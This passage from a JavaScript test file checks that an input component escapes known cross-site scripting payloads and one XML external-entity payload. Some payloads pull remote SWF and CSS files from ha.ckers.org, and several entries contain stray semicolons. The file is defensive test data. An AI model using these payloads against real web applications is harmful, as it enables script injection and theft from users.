    { input: String.raw`'<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;'`, expected: '&lt;;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";&gt;;&lt;;/EMBED&gt;;'},
    { input: String.raw`'<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;'`, expected: String.raw`'&lt;;STYLE TYPE=";text/javascript";&gt;;alert(';XSS';);&lt;;/STYLE&gt;;'`},
    { input: String.raw`'<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;'`, expected: '&lt;;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";&gt;;'},
    { input: String.raw`'<;HTML xmlns:xss>;'`, expected: '&lt;;HTML xmlns:xss&gt;;'},
    { input: String.raw`'perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out'`, expected: String.raw`'perl -e ';print ";&amp;;&lt;;SCR\0IPT&gt;;alert(";XSS";)&lt;;/SCR\0IPT&gt;;";;'; &gt;; out'`},
    { input: String.raw`'<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;'`, expected: '&lt;;A HREF=";http://www.gohttp://www.google.com/ogle.com/";&gt;;XSS&lt;;/A&gt;;'},
    { input: String.raw`'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>'`, expected: ']&gt;&amp;xee;'},
    { input: String.raw`'<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">'`, expected: '<input type="IMAGE">'}
  ];

  testCases.forEach(({ input, expected }) => {
    fireEvent.change(inputElement, { target: { value: input } });
    expect(inputElement).toHaveValue(expected);
    expect(handleChange).toHaveBeenCalledWith(expected);
  });
});

